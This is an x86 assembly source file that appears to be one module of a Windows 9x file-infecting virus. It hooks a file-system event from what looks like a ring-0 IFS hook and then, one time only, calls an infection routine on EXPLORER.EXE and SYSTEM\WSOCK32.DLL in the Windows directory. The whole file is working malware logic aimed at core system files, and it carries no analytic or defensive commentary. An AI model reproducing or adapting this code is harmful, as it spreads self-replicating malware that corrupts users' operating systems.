
include                 ..\..\INCLUDE\consts.inc
include                 ..\..\INCLUDE\s2c.inc
include                 ..\INFECTA\infecta.inc
include                 ..\R0COPY\r0copy.inc
include                 ..\IFSHAN\ifshan.inc

                        public  HandleEvent

                        p386
                        model   flat
                        locals  __
                        jumps

                        .data

complete                db      0

dstfile                 db      260 dup (?)

                        .code

HandleEvent:            cmp     dword ptr [esp+4], EV_IFSHAN_GOT_FILENAME
                        je      __try_install

__ret_0:                xor     eax, eax
                        retn

  ; at this moment, but not when just entered ring-0,
  ; we're able to perform correct file io

__try_install:          cmp     complete, 0
                        jne     __ret_0
                        inc     complete

                        pusha

                        push    offset dstfile
                        callW   getwindir
                        xchg    edi, eax
                        x_stosd \EXPLORER.EXE~
                        call    call_infect

                        push    offset dstfile
                        callW   getwindir
                        xchg    edi, eax
                        x_stosd \SYSTEM\WSOCK32.DLL~
                        call    call_infect

                        ;;

                        popa

                        mov     eax, 1
                        retn

call_infect:            push    offset dstfile
                        push    EV_INFECTA_INFECTFILE
                        callW   Event
                        add     esp, 8
                        retn

                        end
